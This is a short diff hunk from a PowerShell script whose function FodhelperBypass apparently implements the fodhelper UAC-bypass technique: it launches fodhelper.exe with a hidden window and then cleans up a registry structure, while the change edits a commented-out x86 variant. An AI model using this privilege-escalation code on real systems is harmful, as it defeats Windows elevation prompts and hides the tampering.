@@ -43,7 +43,7 @@ function FodhelperBypass(){
 		Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 
 		#In Windows x86
-		#C:\Windows\Sysnative\cmd.exe /c C:\Windows\System32\fodhelper.exe
+		#C:\Windows\Sysnative\cmd.exe /c "powershell Start-Process C:\Windows\System32\fodhelper.exe -WindowStyle Hidden"
 
 	#Remove registry structure
 	Start-Sleep 3
